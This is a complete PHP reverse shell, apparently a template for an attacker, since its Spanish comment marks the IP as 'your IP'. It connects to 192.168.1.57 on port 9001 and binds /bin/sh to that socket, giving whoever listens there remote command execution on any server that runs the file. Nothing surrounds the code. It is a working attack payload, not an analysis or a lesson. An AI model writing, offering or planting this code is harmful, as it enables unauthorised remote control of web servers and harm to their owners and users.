<?php
$ip = '192.168.1.57'; // Tu IP
$port = 9001;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
